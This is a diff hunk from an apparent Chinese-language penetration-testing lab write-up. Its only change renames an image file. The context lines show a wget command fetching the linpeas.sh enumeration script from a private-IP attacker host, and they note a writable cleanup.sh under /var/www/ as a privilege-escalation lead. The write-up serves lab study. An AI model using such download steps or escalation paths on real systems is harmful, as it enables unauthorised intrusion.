@@ -97,7 +97,7 @@ wget http://192.168.45.161:8888/linpeas.sh
 
 * 执行linpeas.sh脚本后，虽然没有找到可以直接利用的凭证信息，但是也发现了以下两处都出现了/var/www/目录下的<mark style="color:red;">**cleanup.sh文件**</mark>：
 
-<figure><img src="../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/18 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 这部分意味着以下文件可以由非root用户创建和修改：
 
